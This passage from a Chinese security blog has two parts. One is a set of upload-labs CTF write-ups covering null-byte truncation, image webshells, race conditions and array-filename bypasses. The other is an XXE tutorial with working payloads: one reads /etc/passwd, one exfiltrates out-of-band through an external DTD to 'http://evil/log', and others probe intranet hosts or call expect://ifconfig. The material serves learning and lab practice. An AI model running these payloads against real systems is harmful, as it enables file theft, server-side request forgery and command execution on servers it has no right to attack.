此时如果我将路径改为，path=”upload/web/1.php%00”,那么拼接上去之后就变成”upload/web/1.php%001.jpg”，那么此时就相当于是上传的是1.php，而1.jpg的jpg被截断了，其实类似于mysql的注释符吧 注意下这里是get形式上传的 参考链接：https://bealright.github.io/2019/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94upload-labs(11-20)/ upload-labs13这一题和上一题没多大区别，依旧参数可控，不过上一题是get形式，而这题是POST那么区别是什么呢？：因为post不会像get对%00进行自动解码，所以需要用16进制进行解码这里我们可以将burpsuit抓包以后将其发送至decoder，将php后的16进制码改为00即可将20改为00即可补充一张截图，这里的a只是为了说明空格的位置，空格其实也可以替换为其他的，因为我们后面会将这个位置的内容换成00，后面的内容均会被截断 upload-labs14 分析源码，fopen为什么后面使用的是rb？ “r”，即文本读取模式，应该使用“rb”模式，也就是二进制读取模式打开文件。 发现他只读两个字节 unpack：从二进制字符串对数据进行解包（用什么打包就用什么解包），加@的原因就是让其怎么都可以执行不报错和一句话木马的那个一个意思 而这里的unpack的意思是 将$bin中的以二进制的形式解包输出到chars中。 而下面这个intval是转化十进制的意思，将本来输出的二进制再转化为十进制，接下来通过这个进行对比 **我一直在想如果是直接解析文件内容，都没解析后缀，怎么知道是什么文件，答案是这样的** 其实,文件对自身文件内容,有着自己的文件头标识,我们只需要文件转为16进制,然后看各个文件类型对文件头的定义,就可以知道文件的类型了,例如,jpeg图片格式的文件头(2byte)标识为:0xff, 0xd8,结尾(2byte)标识为:0xff,0xd9 而转化为二进制再转化为十进制也是一样的 https://blog.csdn.net/LiuBuZhuDeFanHua/article/details/82949144 这里是一些图片文件头以及解码 查阅了一些资料以后发现：数据通信(通过二进制格式与其它语言通信)数据加密(如果不告诉第三方你的打包方式，对方解包的难度就相对很大)节省空间(比如比较大的数字按字符串储存会浪费很多空间，打包成二进制格式才需要4位&lt;32位数字&gt; 解题：因为他只读文本的前两个字节来判断是否为图片形式，我们先上传图片，看看图片的前两个字节是什么是这样的，那我们创建一个图片马试试 https://blog.csdn.net/ltysg0645/article/details/53996658这是制作教程链接，这里采取的是使用cmd命令符窗口指令制作的方式指令是： copy 1.png/b+1.php/a 12.png 接下来上传文件利用文件包含漏洞在inlude.php界面，输入?file=路径+文件名 这样就是成功了 文件包含漏洞https://www.freebuf.com/articles/web/182280.html在这里已经讲得很清楚了，就不重复赘述了这里用我的话讲就是：1.在PHP中含有require()require_once()include()include_once() 这几个函数的时候，可以通过文件包含函数加载另一个文件中的PHP代码然后我们再来分析一下源码 get一个file，如果这个file存在就输出file的内容（这边使用了include函数）而这里为什么图片里的php代码能被解析呢？原因是，在混合代码html+php的框架下， &lt;?php ?&gt; 文件内包含这个的内容会被解析并输出结果，但是如果不是PHP内容的则会直接原样输出。 拓展：web服务器的pathinfo漏洞(文件解析漏洞)文件解析漏洞,是指Web容器（Apache、Nginx、IIS等）在解析文件时将文件解析成脚本文件格式并得以执行而产生的漏洞。从而,黑客可以利用该漏洞实现非法文件的解析。（PS:全称是Internet信息服务（baiInternet Information Service，IIS）。是微软提供的一个zhiWeb服务程序，在开发中称之为Web容器） web容器：web容器是一种服务程序，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如tomcat、apache、nginx等。(可以理解为编程语言提供环境) upload-labs15查看源码，发现他这次使用了一个getimagesize获取文件后缀类型——来自菜鸟教程他的每个后缀都对应一个编号，png对应的就是3这个时候就在想，如果他有多个后缀呢？这个时候我们需要知道getimagesize他读取文件针对的是文件内容，也就是他会对目标文件内容转化而为16进制再去进行一个读取，而根据前面我们可以知道，不同文件类型他的16进制是不同的，在这题当中，我测试了.php.png .png.php的后缀，只要这个文件的本质是图片形式的，他最后上传后显示出来的后缀即为.png（图片）格式后缀的，我们看源码，他最后保存的路径，文件名即为 看上面这个图，他说是前面的十位随机数+.$res的后缀，而这个后缀，就是我们前面通过读取这个图片的十六进制内容所得到的。 所以这题，我们还是直接使用图片马的形式上传就行，因为图片马前面的内容刚好可以绕过过滤（还是图片）。然后先点击查看图片，看看这个随机生成的文件名是什么知道以后就直接利用文件包含漏洞打开即可 PS：这里有个神奇的东西在一堆乱码中居然有一个小星星，哇哦哈哈哈哈哈 upload-labs16 首先是exit_imagetupe()函数： 这个函数也是用来检查是否为图片类型的，函数读取一个图像的第一个字节并检查其签名，如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值和 getimagesize() 的值是一样的，但该函数要快得多。 所以说还是图片马的事情嘛~ 上传图片马 成功，这里就不放截图了 upload-labs17还是依旧分析一下源代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; //basename($...)获取文件名，如果是base($...,&quot;php&quot;)，获取无后缀的文件名 $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片，此处发挥功能的是imagecreatefromjpeg()函数，并且要让这个函数发挥作用，还需开启PHP组件中gd2 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;该文件不是jpg格式的图片！&quot;; //这里unlike删除原文件！！ @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); //这里unlike删除原文件！！ @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像move_uploaded_file() 函数将上传的文件移动到新位置。 有大神说：这里move_uploaded_file已经将图片马上传到服务器当中了，后面的二次渲染是不影响这个图片马的，所以说可以不管这个二次渲染，但是他后面有删除原文件的代码呀，最终上传到服务器的，也就只有二次渲染的文件，所以我也搞不懂为什么可以直接利用move_uploaded_file？原因就是他将第一个 @unlink($target_path); 给删除了 接下来我们就开始解题吧：网上说gif的图比较好过 所以我们就照一张gif对比我们的原图片，发现是这个位置的数据没有发生变化，所以我们就将木马插在这里，后面继续利用文件包含漏洞即可 upload-labs18$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . '/' . $file_name; //in_array() 函数搜索数组中是否存在指定的值。 //rename() 函数重命名文件或目录 if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = '上传出错！'; }} 这一关需要代码审计，那就让我们康康代码将文件上传到服务器，然后进行判断，是否存在白名单后缀，如果存在的话，就保留下来，反之就使用unlink删除这个文件。这题考的是条件竞争 条件竞争漏洞:条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。 所以解题方向就是，在上传以后储存在服务器，到检查不通过的这段时间如果我们可以利用起来，就算后续他将文件删除了也无所谓，那么这段时间太短了，如何将其放大？那就利用burp的intruder，随便弄一个peyload让他在那边跑就行，然后我们在浏览器中直接访问该文件 在观察文件再文件夹的状态时 ![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210118122943.png) 便发现他一直处于删除恢复的状态，此时需要注意的是，burp的线程需要设置得大一些。 拓展参数污染漏洞HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。即针对多个请求， 处理方式不同HPP漏洞的产生原因一方面来自服务器处理机制的不同，另一方面来自开发人员后端检测逻辑的问题。HTTP 参数污染的风险实际上取决于后端所执行的操作，以及被污染的参数提交到了哪里。总体上HPP一般有两种利用场景： 1）逻辑漏洞，通常会造成IDOR，信息泄露，越权等漏洞; 2）作为其他漏洞的辅助，用于绕过漏洞的检测和Waf等。这个漏洞其实之前在sql-labs的时候就有遇到过了。参考文章https://mp.weixin.qq.com/s?__biz=MzI3MTQyNzQxMA==&amp;mid=2247483892&amp;idx=1&amp;sn=bf1b7c8e6242a5b6c3ef2f6169df308b&amp;chksm=eac0b3c9ddb73adfac67da0512b172dbe0a4eda1fab4108646e9e3d714f9a72b927d259ed307&amp;scene=21#wechat_redirect upload-labs19这一关他让我们代码审计，发现 $ret = $this-&gt;move(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 ){ $ret = $this-&gt;renameFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } 本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功 upload-labs20if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); //pathinfo将文件信息以数组的形式返回，这里返回的是后缀 if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = '上传出错！'; } }else{ $msg = '禁止保存为该类型文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 分析源码：他是这样的，比对黑名单，如果后缀和黑名单里的不一样，那么就禁止保存，如果一样，则将文件名保存为上传时的文件的文件名（这是有分步骤的）。这里就需要用到我们之前看过的move_uploaded_file()截断漏洞思路：上传一个jpg文件，内容为php代码，再上传过程中，由于最后保存的文件名我们可控，根据漏洞，将.jpg截断即： upload-labs21在这一关中需要代码审计可以看到后面 if (!in_array($ext, $allow_suffix)) { $msg = &quot;禁止上传该后缀文件!&quot;; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;文件上传成功！&quot;; $is_upload = true; } else { $msg = &quot;文件上传失败！&quot;; 前面的过滤绕过似乎都没有多大意义，毕竟后面还有白名单，但是这个判断条件就很奇怪，如果不是数组类型，则执行此判断，反之就不执行了？？？？那我们就将文件定名变成数组怎么弄呢？先往下看，他文件的命名也很有趣1.reset()函数：指向数组中的第一个元素2.count()返回数组中元素的个数3.end()最后一个元素的值4.explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组。接下来让我们逐个破解：它先将file分割成一个个数组，假设为1.php那么数组为file[0]=1 file[1]=php为了绕过白名单限制，我们可以命名为1.php.jpg接下来是.php最为后缀，1作为前缀变成新文件的文件名 这样好像可行？？试试，不行诶，再来思考一下：1.count()返回数组中元素的个数 而数组从0开始，说明3-1返回的还是后缀，也就是一开始的jpg，这也就说明了为什么最后重新拼接过后的文件名不是我们设想中的123.php那么该如何解决这个麻烦呢？看到move_uploaded_file，使用/.截断试试，或者00截断但是这个时候我们需要让他构造完后变成123.php/.jpg才会起到截断作用，但是我们知道有.就会被分割成数组，这时又该如何呢？再代码以上看 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } 结合burpsuit推测现在的file名字为这个save_name的值，如果我们直接 更改这个save_name为一个数组，那么file也会变成一个数组，这样就不会经过被分割的那个数组，处理恰当，也不会经过白名单，看来是不行，因为他选取的是file这个数组的最后一个元素并将其值直接赋值给ext，故这里的ext不可能再是一个数组，所以，数组最后的元素一定是jpg 但是还是不行？没有报错但却无事发生？？？说明上面是错的 再次调整，将0和1数组调换位置发现报错信息改变了，（这里说明数组要从大到小）变成是文件上传失败 这里尝试了几种组合方式得出： 加不加反斜杠都无所谓，只要为file[1]=0即可 必须先save_name[0]再save_name[2] 唯一不懂的点： 1.count不是返回数组数目吗，count算了一下有0 1 2 三个元素 那么3-1=2 那么返回的为什么是file[1]而不是2 截断上传漏洞原理：http://salt-neko.com/2019/10/27/%E6%88%AA%E6%96%AD%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/ 小结","link":"/2020/12/17/upload-labs1/"},{"title":"xml注入与xxe注入基础知识","text":"xml定义xml由三个部分构成，它们分别是:文档类型定义(dtd)、即xml的布局语言；可拓展的样式语言即xml的样式表语言(xsl)；以及可拓展链接语言(XLL);xml：可拓展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。它被设计用来传输和存储数据，而不是储存数据；可拓展标记语言是一种很像超文本标记语言的标记语言。它的设计宗旨是传输数据，而不是显示数据。它的标签没有被预定义。需要自行定义可扩展标记语言(XML)和超文本标记语言(HTML)为不同的目的而设计它被设计用来传输和存储数据，其焦点是数据的内容。超文本标记语言被设计用来显示数据，其焦点是数据的外观 xml作用XML使用元素和属性来描述数据。在数据传送过程中，XML始终保留了诸如父/子关系这样的数据结构。使用XML做数据交换可以使应用程序更具有弹性，因为可以用位置(与普通文件一样)或用元素名(从数据库)来存取XML数据。 XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!-- ⬆XML声明⬆ --&gt;&lt;!DOCTYPE 文件名 [&lt;!ENTITY实体名 &quot;实体内容&quot;&gt;]&gt;&lt;!-- ⬆文档类型定义(DTD)⬆ --&gt;&lt;元素名称 category=&quot;属性&quot;&gt;文本或其他元素&lt;/元素名称&gt;&lt;!-- ⬆文档元素⬆ --&gt; xml格式说明xml用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML生命、DTD文档类型定义(可选)、文档元素。 &lt;?xml version=&quot;1.0&quot; ?&gt;#xml声明&lt;!DOCTYPE note[&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to(#PCDATA)&gt;&lt;!ELEMENT from(#PCDATA)&gt;&lt;!ELEMENT heading(#PCDATA)&gt;#文档类型定义&lt;!ELEMENT body(#PCDATA)&gt;]&gt;&lt;note&gt;&lt;to&gt;George&lt;/to&gt; #文档元素&lt;from&gt;John&lt;/Ffrom&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don't forget the meeting!&lt;/body&gt; &lt;/note&gt; DTD（文档类型定义）的作用是定义XML文档的合法构建模块、DTF可以在xml文档内生命，也可以外部引用。 （1）内部声明DTD &lt;!DOCTYPE 根元素 [元素声明]&gt; （2）引用外部DTD &lt;!DOCTYPE 根元素 system &quot;文件名&quot;&gt;或者&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot;&quot;文件名&quot;&gt;DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用 （3）DTD的实体作用：DTD（文档类型定义）的作用是定义xml文档的合法构建模块。DTD可以在xml文档内声明，也可以外部引用。 外部实体是指XML处理器必须解析的数据。它对于在多个文档之间创建共享的公共引用很有用。对外部实体进行的任何更改将在包含对其的应用的文档中，自动更新。即xml使用外部实体将信息或“内容”将自动提取到xml文档的正文中。为此，我们需要在xml文档内部声明一个外部实体DTD实体适用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。。我们可以在内部确定其值（内部子集）： &lt;!ENTITY AppSec &quot;Appsec-Labs&quot;&gt; 或从外部来源(外部子集): &lt;!ENTITY AppSec SYSTEM &quot;http://site.com/some_content/html&quot;&gt; SYSTEM标识符：该标识符意味着该实体将从外部来源获取内容，在本例中，该内容是“site.com”下的一个页面。 为了声明这些实体，我们需要在文档类型定义（DTD）中进行。DTD是一组标记声明，用于定义XML的文档类型。它定义了XML文档的合法结构块和具有合法元素和属性列表的文档结构。DTD可以在XML文档内部声明，也可以作为外部引用声明—使用SYSTEM标识符指向可解析位置中的另一组声明。ENTITY可以使用SYSTEM关键字,调用外部资源,而这里是支持很多的协议,如:http;file等，然后,在其他DoM结点中可以使用如:&test;引用该实体内容. 那么,如果在产品功能设计当中,解析的xml是由外部可控制的,那将可能形成,如:文件读取,DoS,CSRF等漏洞. 如果要引用一个外部资源,可以借助各种协议 几个例子: file:///path/to/file.exthttp://url/file.extphp://filter/read=convert.base64-encode/resource=conf.php 我们来看一个DTD的例子，一个在DTD里面有一个SYSTEM标识符的实体： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE Author[&lt;!ENTITY app SYSTEM &quot;http://site.com/some_conten.html&quot;&gt;] l 内部声明实体DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。 一个内部实体声明 例子 DTD: XML: &writer; 注释: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。 l 引用外部实体一个外部实体声明 &lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt; 或者 &lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; 例子 DTD: &lt;!ENTITY writer SYSTEM &quot;http://example.com/dtd/writer.dtd&quot;&gt; XML: &lt;author&gt;&amp;writer;&lt;/author&gt; 外部实体类型有 （4）CDATACDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。 在 XML 元素中，”&lt;” （新元素的开始）和 “&amp;” （字符实体的开始）是非法的。 某些文本，比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。 CDATA 部分中的所有内容都会被解析器忽略。 CDATA 部分由 &quot;&lt;![CDATA[&quot; 开始，由 &quot;]]&gt;&quot; 结束 XML实体XML的实体分为以下五种:字符实体、命名实体、外部实体、参数实体、内部实体、普通实体和参数实体都分为内部实体和外部实体两种，外部实体定义需要加上SYSTEM关键字，其内容是URL所指向的外部文件实际的内容。如果不加SYSTEM关键字，则为内部实体，表示实体代指内容为字符串。 （1.）字符实体指用十进制格式(&#aaa;)或十六进制格式x;来指定任意Unicode字符。对XML解析器而言，字符实体与直接输入指定字符的效果完全相同。 （2）命名实体也称为内部实体，在DTD或内部子集（即文档中&lt;!DOCTYPE&gt;语句的一部分）中生命，在文档中用作引用。在xml文档解析过程中，实体引用将由它的表示替代 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;file:///c://test/1.txt&quot; &gt;]&gt; &lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;http://otherhost/xxxx.php&quot; &gt;]&gt; &lt;value&gt;&amp;xxe;&lt;/value&gt; 可以用做xxe+ssrf （3）外部实体外部实体表示外部文件的内容，用 SYSTEM 关键词表示。 有些XML文档包含system标识符定义的“实体”，这些文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE Anything [&lt;!ENTITY entityex SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;abc&gt;&amp;entityex;&lt;/abc&gt; 在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取，并把读取的内容替换entityex出现的地方。 假如 SYSTEM 后面的内容可以被用户控制，那么用户就可以随意替换为其他内容，从而读取服务器本地文件 （file:///etc/passwd)或者远程文件（http://www.baidu.com/abc.txt） （4）参数实体参数实体只用于DTD和文档的内部子集中，XML的规范定义中，只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的应用在DTD是理解解析的，替换文本将变成DTD的一部分。该类型的实体用“%”字符（或十六进制编码的%）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容 或者 参数实体只能在 DTD文件中被引用，其他实体在XML文档内引用。即下面实例，参数实体 在DOCTYPE内 ，其他实体在外 &lt;!DOCTYPE a [&lt;!ENTITY % name SYSTEM “file:///etc/passwd&quot;&gt; %name;]&gt; 参数实体在DTD中解析优先级高于xml内部实体 实体相当于变量 “file:///etc/passwd”赋值给name 先写一段简单的xml利用代码,以php为例子: &lt;?php$data = file_get_contents('php://input');$xml = simplexml_load_string($data);echo $xml-&gt;name;?&gt;echo $xml-&gt;name;中-&gt;name （5）内部实体内置实体为预留的实体，如： 实体引用字符 &lt; &lt; &gt; &gt; &amp; &amp; &quot; “ &apos; ‘ 而内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。 关于实体嵌套的情况，比较幸运的是DTD中支持单双引号，所以可以通过单双引号间隔使用作为区分嵌套实体和实体之间的关系；在实际使用中，我们通常需要再嵌套一个参数实体，%号是需要处理成 % 如下： &lt;!ENTITY % param1 '&lt;!ENTITY % xxe SYSTEM &quot;http://evil/log?%payload;&quot; &gt;' %也可写为16进制% 另：内部实体的这支持与否也是取决于解释器的 （6）命名实体+外部实体写法&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [&lt;!ENTITY dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt;]&gt; &lt;value&gt;&amp;dtd;&lt;/value&gt; 这种命名实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，感觉命名实体好鸡肋，参数实体就好用很多 （7）第一种命名实体+外部实体+参数实体写法&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt; %dtd; %all; ]&gt; &lt;value&gt;&amp;send;&lt;/value&gt; 其中evil.xml文件内容为 &lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://localhost:88%file;'&gt;&quot;&gt; 调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用命名实体send （8）第二种命名实体+外部实体+参数实体写法&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt;%dtd;%send;]&gt;&lt;root&gt;&lt;/root&gt; 其中evil.xml文件内容为： &lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://localhost:88/?content=%file;'&gt;&quot;&gt; %payload; 调用过程和第一种方法类似 XML中的协议支持 上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有 XXE注入定义XXE注入，即XML 外部实体注入。通过XML实体，“SYSTEM”关键词导致XML解析器可以从本地文件或者远程URI中读取数据。所以攻击者可以通过XML实体传递自己构造的恶意值，是处理程序解析它。当应用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 ENTITY实体，在一个甚至多个XML文档中频繁使用某一条数据，我们预先定义一个这条数据的”别名”，即一个ENTITY，然后再这些文档中需要该数据的地方调用它。XML定义了两种类型的ENTITY，一种在XML文档中使用 若是在PHP中，若是在PHP中,libxml_disable_entity_loader设置为TRUE可禁用外部实体注。入另一种作为参数在DTD文件中使用。ENTITY的定义语法： &lt;!DOCTYPE 文件名 [&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;]&gt;定义好的ENTITY在文档中通过“&amp;实体名;”来使用。举例：&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE booklist [&lt;!ENTITY publisher &quot;ABC company&quot;&gt;]&gt;&lt;booklist&gt;&lt;book&gt;&lt;name&gt;Ajax&lt;/name&gt;&lt;price&gt;$5.95&lt;/price&gt;&lt;description&gt;Foundations of Ajax.&lt;/description&gt;&lt;publisher&gt;&amp;publisher;&lt;/publisher&gt; 这里的&amp;publisher;会被“ABC company”替换&lt;/book&gt;&lt;book&gt;&lt;name&gt;Ajax Patterns&lt;/name&gt;&lt;price&gt;$7.95&lt;/price&gt;&lt;description&gt;Introduction of Ajax Patterns.&lt;/description&gt;&lt;publisher&gt;&amp;publisher;&lt;/publisher&gt; 这里的&amp;publisher;会被“ABC company”替换&lt;/book&gt;&lt;/booklist&gt; 在 XML 中有 5 个预定义的实体引用： &lt; &lt; 小于 &gt; &gt; 大于 &amp; &amp; 和号 &apos; ‘ 省略号 &quot; “ 引号 注释：严格地讲，在 XML 中仅有字符 “&lt;”和”&amp;” 是非法的。省略号、引号和大于号是合法的，但是把它们替换为实体引用是个好的习惯。 7.XXE漏洞原理既然XML可以从外部读取DTD文件，那我们就自然地想到了如果将路径换成另一个文件的路径，那么服务器在解析这个XML的时候就会把那个文件的内容赋值给SYSTEM前面的根元素中，只要我们在XML中让前面的根元素的内容显示出来，不就可以读取那个文件的内容了。这就造成了一个任意文件读取的漏洞。 那如果我们指向的是一个内网主机的端口呢？是否会给出错误信息，我们是不是可以从错误信息上来判断内网主机这个端口是否开放，这就造成了一个内部端口被探测的问题。另外，一般来说，服务器解析XML有两种方式，一种是一次性将整个XML加载进内存中，进行解析；另一种是一部分一部分的、“流式”地加载、解析。如果我们递归地调用XML定义，一次性调用巨量的定义，那么服务器的内存就会被消耗完，造成了拒绝服务攻击。 1.任意文件读取payload如下: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///D://phpStudy//WWW//aa.txt&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 读取aa.txt的内容: 2.探测sql盲注一般在漏洞挖掘中我们是猜测不到 &lt;root&gt;&lt;/root&gt; 里面是name标签的。所以我们用另一种方法更靠谱:推荐网站:http://ceye.io/payloads 找到网站上自带的XML注入利用代码: 稍微整理下生成payload如下: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://9j4jd9.ceye.io/xxe_test&quot;&gt;%remote;]&gt;&lt;root/&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://9j4jd9.ceye.io/xxe_test&quot;&gt;%remote;]&gt;&lt;root/&gt; 看下现在是几点钟: 晚上八点多钟,我们复制payload发送请求: 看下网站里面自带的日志功能: 应该是时间延迟问题。反正相差十分钟以内! 这里接收到我们的payload请求说明是存在XML注入的，用这种方法测试XML注入我感觉很好 1.可以无限制盲打 2.测试简单方便不需要很繁琐测试猜测 3.探测内网地址payload如下:&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.100:80&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 成功探测到内网端口内部信息。 我这是在windows下测试，假如是linux下还可以命令执行: 在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令 测试payload: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://ifconfig&quot; 